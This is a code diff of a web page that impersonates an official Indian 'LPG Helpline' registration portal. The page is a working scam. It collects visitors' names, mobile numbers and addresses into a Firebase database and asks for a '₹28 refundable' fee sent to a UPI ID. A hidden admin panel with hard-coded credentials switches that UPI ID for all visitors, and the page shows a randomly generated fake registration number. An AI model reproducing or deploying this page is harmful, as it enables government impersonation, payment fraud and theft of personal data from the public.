@@ -1,366 +1,167 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Official LPG Helpline India | Registration Portal</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --gov-blue: #003366;
-            --gov-light-blue: #0056b3;
-            --gov-orange: #ff6600;
-            --success-green: #28a745;
-            --bg-gray: #f2f5f8;
-        }
-
+        :root { --gov-blue: #003366; --gov-orange: #ff6600; --bg-gray: #f2f5f8; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            background-color: var(--bg-gray); 
-            margin: 0; 
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-
-        /* Official Header Design */
-        header {
-            background: #fff;
-            border-bottom: 3px solid var(--gov-orange);
-            padding: 10px 15px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
+        body { font-family: 'Roboto', sans-serif; background-color: var(--bg-gray); margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        header { background: #fff; border-bottom: 3px solid var(--gov-orange); padding: 10px 15px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         .gov-logo { display: flex; align-items: center; gap: 10px; }
-        .gov-logo img { height: 45px; }
-        .gov-text { line-height: 1.2; }
+        .gov-logo img { height: 40px; }
         .gov-text span { display: block; font-weight: 700; color: var(--gov-blue); font-size: 0.9rem; }
-        .gov-text small { color: #666; font-size: 0.7rem; }
-
-        /* Main Container */
-        .main-content {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            padding: 20px 15px;
-        }
-
-        .portal-card {
-            background: #fff;
-            width: 100%;
-            max-width: 450px;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-            border: 1px solid #d1d9e0;
-        }
-
-        .step-header {
-            background: var(--gov-blue);
-            color: white;
-            padding: 15px;
-            text-align: center;
-        }
-        .step-header h2 { margin: 0; font-size: 1.1rem; text-transform: uppercase; letter-spacing: 0.5px; }
-
-        /* Progress Steps */
-        .progress-bar {
-            display: flex;
-            background: #e9ecef;
-            height: 6px;
-        }
-        .progress-fill {
-            height: 100%;
-            background: var(--gov-orange);
-            width: 33.33%;
-            transition: width 0.4s ease;
-        }
-
+        .main-content { flex: 1; display: flex; justify-content: center; padding: 20px 15px; }
+        .portal-card { background: #fff; width: 100%; max-width: 450px; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border: 1px solid #d1d9e0; }
+        .step-header { background: var(--gov-blue); color: white; padding: 15px; text-align: center; }
+        .progress-bar { display: flex; background: #e9ecef; height: 6px; }
+        .progress-fill { height: 100%; background: var(--gov-orange); width: 33.33%; transition: width 0.4s ease; }
         .form-body { padding: 25px 20px; }
-
-        .input-group { margin-bottom: 18px; }
-        label { display: block; margin-bottom: 6px; font-weight: 500; color: #444; font-size: 0.9rem; }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ced4da;
-            border-radius: 5px;
-            font-size: 1rem;
-            transition: border-color 0.2s;
-        }
-        input:focus { border-color: var(--gov-light-blue); outline: none; background-color: #f8fbff; }
-
-        /* Professional Info Box */
-        .alert-info {
-            background-color: #e7f3ff;
-            border-left: 5px solid var(--gov-light-blue);
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 0.85rem;
-            color: #1a4a7a;
-        }
-
-        .payment-box {
-            border: 2px dashed #cbd5e0;
-            background: #fdfdfd;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            margin-top: 10px;
-        }
-
-        .upi-copy-field {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #eee;
-            padding: 12px;
-            border-radius: 6px;
-            margin-top: 10px;
-            font-weight: 700;
-            font-family: monospace;
-            font-size: 1.1rem;
-        }
-
-        .copy-btn {
-            background: var(--gov-light-blue);
-            color: white;
-            padding: 5px 12px;
-            border-radius: 4px;
-            font-size: 0.75rem;
-            cursor: pointer;
-            text-decoration: none;
-            border: none;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 15px;
-            background: var(--gov-orange);
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 10px;
-            box-shadow: 0 4px 0 #cc5200;
-        }
-        .btn-primary:active { transform: translateY(2px); box-shadow: 0 2px 0 #cc5200; }
-        .btn-primary:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
-
-        /* Spinner */
-        .loader {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
-        }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 5px; margin-bottom: 15px; font-size: 1rem; }
+        .payment-box { border: 2px dashed #cbd5e0; background: #fdfdfd; padding: 15px; text-align: center; border-radius: 10px; }
+        .upi-field { background: #eee; padding: 12px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; font-weight: 700; margin-top: 10px; }
+        .btn-primary { width: 100%; padding: 15px; background: var(--gov-orange); color: white; border: none; border-radius: 5px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 0 #cc5200; }
+        .loader { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; margin: 0 auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Success Page View */
         .success-page { display: none; text-align: center; padding: 40px 20px; }
-        .success-icon { font-size: 4rem; color: var(--success-green); margin-bottom: 15px; }
-        .reg-number-box {
-            background: #f0fdf4;
-            border: 2px solid #bbf7d0;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-        }
-        .reg-number-box h3 { margin: 0; font-size: 1.6rem; color: var(--gov-blue); letter-spacing: 2px; }
-
-        /* Admin Trigger & Modal */
-        .admin-link { text-align: center; padding: 15px; font-size: 0.65rem; color: #ccc; cursor: pointer; }
-        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center; }
+        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:999; align-items:center; justify-content:center; }
         .modal-body { background:#fff; padding:25px; border-radius:12px; width:90%; max-width:320px; }
-
-        @media (max-width: 480px) {
-            .portal-card { border-radius: 0; box-shadow: none; border: none; }
-            .main-content { padding: 0; }
-            body { background-color: #fff; }
-        }
     </style>
 </head>
 <body>
 
 <header>
     <div class="gov-logo">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Flag_of_India.svg/1200px-Flag_of_India.svg.png" alt="India Flag">
-        <div class="gov-text">
-            <span>LPG HELPLINE INDIA</span>
-            <small>Ministry of Petroleum & Natural Gas</small>
-        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Flag_of_India.svg/1200px-Flag_of_India.svg.png">
+        <div class="gov-text"><span>LPG HELPLINE INDIA</span></div>
     </div>
 </header>
 
 <div class="main-content">
     <div class="portal-card">
-        <div class="progress-bar">
-            <div id="progFill" class="progress-fill"></div>
-        </div>
-
+        <div class="progress-bar"><div id="progFill" class="progress-fill"></div></div>
+        
         <div id="p1">
             <div class="step-header"><h2>1. Personal Details</h2></div>
             <div class="form-body">
-                <div class="input-group">
-                    <label>Consumer Full Name</label>
-                    <input type="text" id="name" placeholder="Enter as per ID Proof">
-                </div>
-                <div class="input-group">
-                    <label>Mobile Number (Registered)</label>
-                    <input type="tel" id="mobile" placeholder="10 Digit Mobile No." maxlength="10">
-                </div>
-                <button class="btn-primary" onclick="showStep(2)">Proceed to Address</button>
+                <input type="text" id="custName" placeholder="Full Name">
+                <input type="tel" id="custMobile" placeholder="Mobile Number" maxlength="10">
+                <button class="btn-primary" onclick="showStep(2)">Proceed</button>
             </div>
         </div>
 
         <div id="p2" style="display:none">
-            <div class="step-header"><h2>2. Location & City</h2></div>
+            <div class="step-header"><h2>2. Address</h2></div>
             <div class="form-body">
-                <div class="input-group">
-                    <label>Full Delivery Address</label>
-                    <input type="text" placeholder="House/Flat No, Landmark, Area">
-                </div>
-                <div class="input-group">
-                    <label>Select Your City</label>
-                    <input type="text" id="citySearch" placeholder="Search City Name..." onkeyup="filterCities()" style="margin-bottom: 5px;">
-                    <select id="citySelect" size="4">
-                        <option>Mumbai</option><option>Delhi</option><option>Bangalore</option>
-                        <option>Hyderabad</option><option>Ahmedabad</option><option>Chennai</option>
-                        <option>Kolkata</option><option>Surat</option><option>Pune</option><option>Patna</option>
-                    </select>
-                </div>
-                <button class="btn-primary" onclick="showStep(3)">Payment & Verification</button>
+                <input type="text" id="custAddr" placeholder="Full Address">
+                <select id="citySelect"><option>Mumbai</option><option>Delhi</option><option>Patna</option></select>
+                <button class="btn-primary" onclick="showStep(3)">Verification</button>
             </div>
         </div>
 
         <div id="p3" style="display:none">
-            <div class="step-header"><h2>3. Verification Fee</h2></div>
+            <div class="step-header"><h2>3. Payment</h2></div>
             <div class="form-body">
-                <div class="alert-info">
-                    <strong>Refund Policy:</strong> The registration fee of <b>₹28.00</b> is <u>100% refundable</u>. This amount will be credited back to your bank account once your gas connection is successfully verified and delivered.
-                </div>
-
                 <div class="payment-box">
-                    <p style="margin:0; font-size:0.8rem; color:#666">Transfer Amount: <b>₹28.00</b></p>
-                    <div class="upi-copy-field">
-                        <span id="upiIdDisplay">7979876704@paytm</span>
-                        <button class="copy-btn" onclick="copyUPI()">COPY</button>
-                    </div>
-                    <p style="font-size:0.75rem; color:var(--gov-orange); margin-top:10px; font-weight:700">Scan or Transfer to the Official UPI ID above</p>
+                    <p>Fee: <b>₹28.00</b> (Refundable)</p>
+                    <div class="upi-field"><span id="upiDisplay">Loading...</span><button onclick="copyUPI()" style="background:none; border:1px solid #0056b3; color:#0056b3; padding:2px 8px; cursor:pointer">COPY</button></div>
                 </div>
-
-                <button id="finalBtn" class="btn-primary" onclick="submitApp()">
-                    <span id="btnText">SUBMIT REGISTRATION</span>
-                    <div class="loader" id="btnLoader"></div>
+                <button id="finalBtn" class="btn-primary" onclick="submitApp()" style="margin-top:20px">
+                    <span id="btnText">SUBMIT</span><div class="loader" id="btnLoader"></div>
                 </button>
-                <div class="admin-link" onclick="openAdmin()">ADMIN PORTAL LOGIN</div>
+                <p onclick="openAdmin()" style="text-align:center; font-size:0.7rem; color:#ccc; margin-top:15px; cursor:pointer">ADMIN LOGIN</p>
             </div>
         </div>
 
         <div id="successPage" class="success-page">
-            <div class="success-icon">✔</div>
-            <h2 style="margin:0; color:var(--gov-blue)">Application Submitted</h2>
-            <p style="color:#666; font-size:0.9rem">Your LPG registration is currently under review.</p>
-            
-            <div class="reg-number-box">
-                <small style="color:#888; font-weight:700">REGISTRATION NUMBER</small>
-                <h3 id="finalReg">LPG-1029384</h3>
-                <button class="copy-btn" style="margin-top:10px; padding:10px 20px" onclick="copyReg()">COPY NUMBER</button>
+            <h2 style="color:green">✔ Submitted</h2>
+            <div style="background:#f0fdf4; border:1px solid #bbf7d0; padding:15px; margin:20px 0">
+                <small>REG NO:</small><h3 id="finalReg">---</h3>
             </div>
-
-            <p style="font-size:0.8rem; padding:0 10px">Please keep this number safe. Our agent will call you at your registered mobile number for final KYC verification.</p>
+            <button class="btn-primary" onclick="location.reload()">New Registration</button>
         </div>
     </div>
 </div>
 
 <div id="admModal" class="modal">
     <div class="modal-body">
-        <h3 style="margin-top:0">Portal Admin Login</h3>
-        <input type="text" id="aid" placeholder="Admin ID" style="margin-bottom:10px">
-        <input type="password" id="apass" placeholder="Password" style="margin-bottom:10px">
+        <h3>Admin Login</h3>
+        <input type="text" id="aid" placeholder="ID">
+        <input type="password" id="apass" placeholder="Password">
         <button class="btn-primary" onclick="loginAdmin()">Login</button>
-        <div id="admInside" style="display:none; margin-top:15px; padding-top:15px; border-top:1px solid #eee">
-            <label>Update Recipient UPI</label>
-            <input type="text" id="newUpi" placeholder="new-id@okaxis">
-            <button class="btn-primary" style="background:var(--success-green); box-shadow:0 4px 0 #1e7e34" onclick="updateUpi()">Save Changes</button>
+        <div id="admInside" style="display:none; margin-top:15px">
+            <input type="text" id="newUpi" placeholder="new-id@upi">
+            <button class="btn-primary" onclick="updateUpi()">Save Changes</button>
         </div>
-        <button class="btn-primary" style="background:#666; box-shadow:none; margin-top:10px" onclick="closeAdmin()">Close</button>
+        <button class="btn-primary" style="background:#666; margin-top:10px" onclick="closeAdmin()">Close</button>
     </div>
 </div>
 
 <script>
-    let currentUpi = "7979876704@paytm";
+    const firebaseConfig = {
+        apiKey: "AIzaSyDiKLam4sX7-gu46iXoelkmnEtg8kMIUJo",
+        authDomain: "shadi-nimantan.firebaseapp.com",
+        projectId: "shadi-nimantan",
+        storageBucket: "shadi-nimantan.firebasestorage.app",
+        messagingSenderId: "469197349027",
+        appId: "1:469197349027:web:38e70bc3df1ccbe578df16"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    let currentUpi = "";
+
+    db.collection("settings").doc("payment").onSnapshot(doc => {
+        if(doc.exists) {
+            currentUpi = doc.data().upi;
+            document.getElementById('upiDisplay').innerText = currentUpi;
+        }
+    });
 
     function showStep(s) {
-        document.getElementById('p1').style.display = 'none';
-        document.getElementById('p2').style.display = 'none';
-        document.getElementById('p3').style.display = 'none';
-        document.getElementById('p'+s).style.display = 'block';
-        document.getElementById('progFill').style.width = (s * 33.33) + '%';
-        window.scrollTo(0,0);
+        document.getElementById('p1').style.display = document.getElementById('p2').style.display = document.getElementById('p3').style.display = "none";
+        document.getElementById('p'+s).style.display = "block";
+        document.getElementById('progFill').style.width = (s * 33.33) + "%";
     }
 
-    function filterCities() {
-        let input = document.getElementById('citySearch').value.toUpperCase();
-        let options = document.getElementById('citySelect').options;
-        for (let opt of options) {
-            opt.style.display = opt.text.toUpperCase().indexOf(input) > -1 ? "" : "none";
-        }
-    }
-
-    function copyUPI() {
-        navigator.clipboard.writeText(currentUpi);
-        alert("Official UPI ID Copied!");
-    }
+    function copyUPI() { navigator.clipboard.writeText(currentUpi); alert("UPI Copied"); }
 
     function submitApp() {
+        const name = document.getElementById('custName').value;
+        const mobile = document.getElementById('custMobile').value;
+        if(!name || !mobile) return alert("Fill all details");
+
         document.getElementById('btnText').style.display = 'none';
         document.getElementById('btnLoader').style.display = 'block';
-        document.getElementById('finalBtn').disabled = true;
 
-        setTimeout(() => {
+        db.collection("registrations").add({
+            name, mobile, address: document.getElementById('custAddr').value, 
+            city: document.getElementById('citySelect').value,
+            time: firebase.firestore.FieldValue.serverTimestamp()
+        }).then(() => {
             document.getElementById('p3').style.display = 'none';
-            document.getElementById('progFill').parentElement.style.display = 'none';
             document.getElementById('successPage').style.display = 'block';
-            
-            let reg = "LPG-" + Math.floor(1000000 + Math.random() * 9000000);
-            document.getElementById('finalReg').innerText = reg;
-        }, 2500);
+            document.getElementById('finalReg').innerText = "LPG-" + Math.floor(100000 + Math.random() * 900000);
+        });
     }
 
-    function copyReg() {
-        navigator.clipboard.writeText(document.getElementById('finalReg').innerText);
-        alert("Registration Number Copied!");
-    }
-
-    /* Admin Scripts */
-    function openAdmin() { document.getElementById('admModal').style.display = 'flex'; }
-    function closeAdmin() { 
-        document.getElementById('admModal').style.display = 'none'; 
-        document.getElementById('admInside').style.display = 'none';
-    }
+    function openAdmin() { document.getElementById('admModal').style.display = "flex"; }
+    function closeAdmin() { document.getElementById('admModal').style.display = "none"; }
     function loginAdmin() {
-        if(document.getElementById('aid').value === "meta1234" && document.getElementById('apass').value === "meta@1234") {
-            document.getElementById('admInside').style.display = 'block';
-        } else { alert("Access Denied"); }
+        if(document.getElementById('aid').value === "meta1234" && document.getElementById('apass').value === "meta@1234") 
+            document.getElementById('admInside').style.display = "block";
     }
     function updateUpi() {
-        currentUpi = document.getElementById('newUpi').value;
-        document.getElementById('upiIdDisplay').innerText = currentUpi;
-        alert("Payment System Updated Successfully");
-        closeAdmin();
+        db.collection("settings").doc("payment").set({ upi: document.getElementById('newUpi').value })
+        .then(() => { alert("Updated Global UPI!"); closeAdmin(); });
     }
 </script>
-
 </body>
 </html>
